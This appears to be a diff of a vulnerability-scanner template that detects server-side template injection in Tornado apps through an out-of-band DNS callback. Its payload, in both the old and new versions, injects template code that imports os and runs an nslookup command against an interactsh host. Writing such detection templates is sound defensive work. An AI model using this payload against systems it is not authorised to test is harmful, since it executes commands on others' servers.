@@ -1,5 +1,4 @@
 id: tornado-oob
-
 info:
   name: Tornado - Out of Band Template Injection
   author: 0xAwali,DhiyaneshDK
@@ -9,32 +8,32 @@ info:
     - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
   metadata:
     verified: true
-  tags: ssti,dast,oast,oob,vuln
-
+  tags: dast,oast,oob,ssti,vuln
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
+  - fuzzing:
+      - fuzz:
+          - '{{injection}}'
+        mode: single
+        parts:
+          - query
+          - body
+        type: postfix
+    matchers:
+      - condition: and
+        # digest: 490a00463044022014852555bda22cb81ecf0864a90d017aec12da77e140f7ad51f038c7183f1f68022008296a68151cbbe6755eb57d5d85eb8c3efe1ebdccfa0b1f870e0ca22ee747a8:922c64590222798bb761d5b6d8e72950
 
+        dsl:
+          - contains(interactsh_protocol,'dns')
+          - contains(interactsh_request,'srv')
+        name: request-matcher
+        type: dsl
     payloads:
       injection:
-        - "{%25import+os%25}{{os.system('nslookup+-type=SRV+{{interactsh-url}}')}}"
-
+        - '{%25import+os%25}{{os.system(''nslookup+-type=SRV+{{interactsh-url}}'')}}'
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
     skip-variables-check: true
-
-    fuzzing:
-      - part: query
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{injection}}"
-
-    matchers:
-      - type: dsl
-        name: request-matcher
-        dsl:
-          - "contains(interactsh_protocol,'dns')"
-          - "contains(interactsh_request,'srv')"
-        condition: and
-# digest: 4a0a00473045022100ef552da7b24cf291c71de4542e1b494c6a306c6b88adb7b66b32f99c8f9cbe3e022008c70d80e9a943ca671b48b9feafc2a52d143ab2dc4e4a1d119adde22c11a97b:922c64590222798bb761d5b6d8e72950
